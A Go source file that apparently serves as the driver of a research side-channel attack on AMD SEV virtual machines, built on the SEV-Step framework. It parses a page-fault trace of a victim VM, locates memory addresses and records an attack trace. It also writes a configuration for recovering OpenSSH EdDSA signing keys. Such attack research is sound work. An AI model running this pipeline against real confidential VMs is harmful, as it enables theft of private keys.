package main

import (
	"bufio"
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"pfFingerprint"
	"pfFingerprint/trigger"

	"github.com/UzL-ITS/sev-step/sevStep"
)

type application struct {
	execTracePath       string
	trigger             trigger.Triggerer
	tryGetRIP           bool
	kvmDevicePath       string
	attackTraceOutPath  string
	attackConfigOutPath string
	dbgCryptoSignGPA    uint64
	dbgScalarMultGPA    uint64
	cpu                 int
	debugLog            *log.Logger
}

func setupAndParseCLI() (*application, error) {
	//
	//declare args
	//
	execTracePath := flag.String("execTrace", "pf-log.txt", "Path to file with full trace of victim execution")
	triggerURI := flag.String("triggerURI", "ssh://luca@localhost:2223", "URI to trigger victim behaviour")
	getRIP := flag.Bool("getRIP", true, "Try to get RIP for page fault events. Works only for plain VMs and debug SEV-ES VMs")
	out := flag.String("out", "attack-trace.txt", "Save attack trace at this path")
	configOut := flag.String("configOut", "attack-config.json", "Save attack config to this path")
	cryptoSignGPA := flag.Uint64("cryptoSignGPA", 0, "Explicitly specify for debugging")
	scalarMultGPA := flag.Uint64("scalarMult", 0, "Explicitly specify for debugging")
	cpu := flag.Int("cpu", -1, "If set, perf readings are done on this cpu and wbinvd flush is executed here before memaccess")
	debugLog := flag.Bool("debugLog", false, "Verbose logging for debug purposes")

	flag.Parse()

	//
	// parse args
	//

	app := &application{}

	if *execTracePath == "" {
		return nil, fmt.Errorf("\"-execTrace\" may not be empty")
	}
	app.execTracePath = *execTracePath

	victimTrigger, err := trigger.NewTriggerFromURI(*triggerURI)
	if err != nil {
		log.Printf("Failed to parse triggerURI :%v", err)
	}
	app.trigger = victimTrigger

	app.tryGetRIP = *getRIP
	app.kvmDevicePath = `/dev/kvm`

	if *out == "" {
		return nil, fmt.Errorf(`"-out" may not be empty`)
	}
	app.attackTraceOutPath = *out

	if *configOut == "" {
		return nil, fmt.Errorf(`"-configOut" may not be empty`)
	}
	app.attackConfigOutPath = *configOut

	app.dbgScalarMultGPA = *scalarMultGPA
	app.dbgCryptoSignGPA = *cryptoSignGPA

	app.cpu = *cpu

	if *debugLog {
		app.debugLog = log.Default()
	} else {
		app.debugLog = log.New(ioutil.Discard, "", 0)
	}

	return app, nil
}

func run(app *application) error {
	//
	//parse events from input file
	//
	f, err := os.Open(app.execTracePath)
	if err != nil {
		return fmt.Errorf("failed to open exec trace file : %v", err)
	}
	defer func() {
		if err := f.Close(); err != nil {
			log.Printf("Failed to close exec trace file : %v", err)
		}
	}()

	reader := bufio.NewReader(f)

	log.Printf("Parse input file...")
	events, err := sevStep.ParseInputFile(reader)
	if err != nil {
		return fmt.Errorf("failed to parse events : %v", err)
	}
	log.Printf("Parsed %v events\n", len(events))

	//
	// Analyse input logs to get GPAs for attack
	//
	attackConfig, err := generateAttackConfig(app, events)
	if err != nil {
		return fmt.Errorf("failed to generate attack config : %v", err)
	}
	//
	// Record attack trace
	//
	attackTrace, stackBufferGPA, sigMsg, err := recordAttackTrace(context.Background(), app, attackConfig)
	if err != nil {
		return fmt.Errorf("recordAttackTrace failed : %v", err)
	}

	outFile, err := os.Create(app.attackTraceOutPath)
	if err != nil {
		return fmt.Errorf("failed to ceate out file %v : %v", app.attackTraceOutPath, err)
	}
	defer func() {
		if err := outFile.Close(); err != nil {
			log.Printf("Failed to close out file")
		}
	}()
	outWriter := bufio.NewWriter(outFile)

	for _, v := range attackTrace {
		buf, err := json.Marshal(v)
		if err != nil {
			return fmt.Errorf("failed to marshall event: %v", err)
		}
		if _, err := outWriter.Write(append(buf, []byte("\n")...)); err != nil {
			return fmt.Errorf("failed to save attack tracke : %v", err)
		}
	}
	if err := outWriter.Flush(); err != nil {
		return fmt.Errorf("failed to flush output file : %v", err)
	}

	//
	// Write config struct for next stage
	//
	keyRecoverConfig := pfFingerprint.OSSHAttackConfigEdDSA{
		ChooseTGPA:          attackConfig.chosetTGPA,
		Fe64GPA:             attackConfig.fe64GPA,
		StackBufGPA:         stackBufferGPA,
		MemAccessesPerCycle: 10, //manual analysis, want all accesses right before the swap function
		SigMsg:              sigMsg,
		MainLoopCycles:      85,
		StackBufAlignment:   16,
		StackBufBytes:       256,
	}
	keyRecoverConfigBytes, err := json.Marshal(keyRecoverConfig)
	if err != nil {
		return fmt.Errorf("failed to marshal attack config : %v", err)
	}
	if err := ioutil.WriteFile(app.attackConfigOutPath, keyRecoverConfigBytes, 0770); err != nil {
		return fmt.Errorf("failed to write attack config to file : %v", err)
	}

	return nil
}

func main() {
	app, err := setupAndParseCLI()
	if err != nil {
		log.Printf("Failed to parse cli args : %v", err)
		return
	}

	if err := run(app); err != nil {
		log.Printf("Error : %v", err)
	}
}
